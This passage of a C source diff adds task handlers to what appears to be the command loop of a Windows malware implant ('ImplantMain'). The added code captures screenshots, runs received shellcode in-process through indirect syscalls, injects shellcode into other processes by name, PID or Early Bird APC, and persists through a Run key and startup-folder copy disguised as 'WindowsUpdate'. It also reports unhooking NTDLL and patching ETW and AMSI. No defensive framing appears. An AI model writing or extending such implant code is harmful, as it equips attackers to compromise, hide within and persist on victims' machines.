+                            GetDIBits(hDC, hBmp, 0, cy,
+                                pBmp + sizeof(bmfh) + sizeof(bmih),
+                                (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
+                            res->pOutput    = pBmp;
+                            res->dwOutputLen = dwFileSize;
+                        } else {
+                            strcpy(res->szError, "screenshot: alloc failed");
+                        }
+                        DeleteObject(hBmp);
+                        DeleteDC(hDC);
+                        ReleaseDC(NULL, hScreen);
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── SHELLCODE (local exec via indirect syscalls) ───
+                    case TASK_SHELLCODE: {
+                        if (pTasks[i].pData && pTasks[i].dwDataLen > 0) {
+                            PBYTE pSc = (PBYTE)HeapAlloc(GetProcessHeap(), 0, pTasks[i].dwDataLen);
+                            if (pSc) {
+                                memcpy(pSc, pTasks[i].pData, pTasks[i].dwDataLen);
+                                BOOL bOk = LocalShellcodeExecSyscall(pSc, pTasks[i].dwDataLen);
+                                PCHAR msg = bOk ? "[+] Shellcode executed in-process"
+                                               : "[-] Shellcode execution failed";
+                                DWORD mlen = (DWORD)strlen(msg);
+                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
+                                memcpy(res->pOutput, msg, mlen);
+                                res->dwOutputLen = mlen;
+                                HeapFree(GetProcessHeap(), 0, pSc);
+                            }
+                        } else {
+                            strcpy(res->szError, "shellcode: no payload data");
+                        }
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── INJECT (remote process / early bird APC) ──────
+                    case TASK_INJECT: {
+                        if (pTasks[i].pData && pTasks[i].dwDataLen > 0 && pTasks[i].dwArgCount > 0) {
+                            PBYTE pSc = (PBYTE)HeapAlloc(GetProcessHeap(), 0, pTasks[i].dwDataLen);
+                            if (pSc) {
+                                memcpy(pSc, pTasks[i].pData, pTasks[i].dwDataLen);
+                                BOOL bOk = FALSE;
+                                CHAR szMsg[256] = {0};
+
+                                // Args[1] == "earlybird" → spawn+APC into a new process
+                                if (pTasks[i].dwArgCount > 1 &&
+                                    strcmp(pTasks[i].szArgs[1], "earlybird") == 0) {
+                                    bOk = EarlyBirdApcInject(pSc, pTasks[i].dwDataLen,
+                                            pTasks[i].szArgs[0]);
+                                    sprintf(szMsg, bOk
+                                        ? "[+] Early Bird APC injected into %s"
+                                        : "[-] Early Bird APC failed (%s)", pTasks[i].szArgs[0]);
+                                } else {
+                                    // Remote inject: try by name first, then by PID
+                                    DWORD dwPID = 0; HANDLE hProc = NULL;
+                                    WCHAR wsName[256] = {0};
+                                    MultiByteToWideChar(CP_UTF8, 0, pTasks[i].szArgs[0],
+                                        -1, wsName, 256);
+                                    if (GetRemoteProcessHandle(wsName, &dwPID, &hProc) && hProc) {
+                                        bOk = InjectShellcodeSyscall(hProc, pSc, pTasks[i].dwDataLen);
+                                        CloseHandle(hProc);
+                                        sprintf(szMsg, bOk
+                                            ? "[+] Injected into %s (PID %lu)"
+                                            : "[-] Injection failed (%s)", pTasks[i].szArgs[0], dwPID);
+                                    } else {
+                                        DWORD pid = (DWORD)atoi(pTasks[i].szArgs[0]);
+                                        if (pid > 0) {
+                                            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+                                            if (hProc) {
+                                                bOk = InjectShellcodeSyscall(hProc, pSc,
+                                                        pTasks[i].dwDataLen);
+                                                CloseHandle(hProc);
+                                            }
+                                        }
+                                        sprintf(szMsg, bOk
+                                            ? "[+] Injected into PID %s"
+                                            : "[-] Inject failed: process '%s' not found",
+                                            pTasks[i].szArgs[0]);
+                                    }
+                                }
+                                DWORD mlen = (DWORD)strlen(szMsg);
+                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
+                                memcpy(res->pOutput, szMsg, mlen);
+                                res->dwOutputLen = mlen;
+                                HeapFree(GetProcessHeap(), 0, pSc);
+                            }
+                        } else {
+                            strcpy(res->szError, "inject: target and shellcode data required");
+                        }
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── PERSIST (registry run key + startup folder) ───
+                    case TASK_PERSIST: {
+                        CHAR szExe[MAX_PATH] = {0};
+                        GetModuleFileNameA(NULL, szExe, MAX_PATH);
+                        PCHAR szMethod = (pTasks[i].dwArgCount > 0)
+                            ? pTasks[i].szArgs[0] : "registry";
+                        BOOL bOk = FALSE;
+                        CHAR szMsg[512] = {0};
+
+                        if (strcmp(szMethod, "registry") == 0 || strcmp(szMethod, "run") == 0) {
+                            HKEY hKey;
+                            if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                                if (RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
+                                    (BYTE*)szExe, (DWORD)strlen(szExe) + 1) == ERROR_SUCCESS) {
+                                    bOk = TRUE;
+                                    sprintf(szMsg, "[+] Registry Run key set:\n"
+                                        "    HKCU\\Software\\Microsoft\\Windows\\"
+                                        "CurrentVersion\\Run\\WindowsUpdate\n    = %s", szExe);
+                                }
+                                RegCloseKey(hKey);
+                            }
+                        } else if (strcmp(szMethod, "startup") == 0) {
+                            CHAR szStartup[MAX_PATH] = {0};
+                            SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szStartup);
+                            CHAR szDest[MAX_PATH] = {0};
+                            sprintf(szDest, "%s\\WindowsUpdate.exe", szStartup);
+                            if (CopyFileA(szExe, szDest, FALSE)) {
+                                bOk = TRUE;
+                                sprintf(szMsg, "[+] Copied to startup folder:\n    %s", szDest);
+                            }
+                        }
+
+                        if (!bOk && szMsg[0] == '\0')
+                            sprintf(szMsg, "[-] Persist failed (method: %s, err %lu)",
+                                szMethod, GetLastError());
+                        else if (!bOk)
+                            strcat(szMsg, " (failed)");
+
+                        DWORD mlen = (DWORD)strlen(szMsg);
+                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
+                        memcpy(res->pOutput, szMsg, mlen);
+                        res->dwOutputLen = mlen;
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── SLEEP ────────────────────────────────────────
                     case TASK_SLEEP:
                         if (pTasks[i].dwArgCount > 0) {
                             session.dwSleepMs = (DWORD)(atoi(pTasks[i].szArgs[0]) * 1000);
+                            if (pTasks[i].dwArgCount > 1)
+                                session.dwJitterPct = (DWORD)atoi(pTasks[i].szArgs[1]);
                         }
-                        res->pOutput = (PBYTE)"ok";
-                        res->dwOutputLen = 2;
+                        res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, 3);
+                        if (res->pOutput) { memcpy(res->pOutput, "ok", 2); res->dwOutputLen = 2; }
                         dwResultCount++;
                         break;
+
+                    // ── KILL ─────────────────────────────────────────
                     case TASK_KILL:
                         TransportCleanup();
                         return;
+
+                    // ── SYSINFO ──────────────────────────────────────
                     case TASK_SYSINFO: {
                         CHAR szInfo[1024];
-                        CHAR szH[256] = {0}, szU[256] = {0}, szO[32] = {0};
-                        CHAR szA[16] = {0}, szP[MAX_PATH] = {0}, szI[64] = {0};
+                        CHAR szH[256]={0}, szU[256]={0}, szO[32]={0};
+                        CHAR szA[16]={0}, szP[MAX_PATH]={0}, szI[64]={0};
                         DWORD pid = 0;
                         CollectSysInfo(szH, szU, szO, szA, &pid, szP, szI);
-                        DWORD len = (DWORD)sprintf(szInfo, "%s\n%s\n%s\n%s\n%lu\n%s\n%s",
+                        DWORD len = (DWORD)sprintf(szInfo,
+                            "%s\n%s\n%s\n%s\n%lu\n%s\n%s",
                             szH, szU, szO, szA, pid, szP, szI);
                         res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
                         memcpy(res->pOutput, szInfo, len);
@@ -909,9 +1319,12 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                         dwResultCount++;
                         break;
                     }
+
+                    // ── EVASION ──────────────────────────────────────
                     case TASK_EVASION: {
                         BOOL bOk = RunAllEvasion();
-                        PCHAR msg = bOk ? "evasion: all patches applied" : "evasion: partial failure";
+                        PCHAR msg = bOk ? "[+] Evasion: NTDLL unhooked, ETW patched, AMSI patched"
+                                        : "[-] Evasion: partial failure";
                         DWORD mlen = (DWORD)strlen(msg);
                         res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
                         memcpy(res->pOutput, msg, mlen);
@@ -919,6 +1332,7 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                         dwResultCount++;
                         break;
                     }
+
                     default:
                         sprintf(res->szError, "unsupported task type: %d", pTasks[i].bType);
                         dwResultCount++;
@@ -930,7 +1344,6 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                 HeapFree(GetProcessHeap(), 0, pTasks);
         }
 
-        // Sleep with jitter
         SleepWithJitter(session.dwSleepMs, session.dwJitterPct);
     }
 
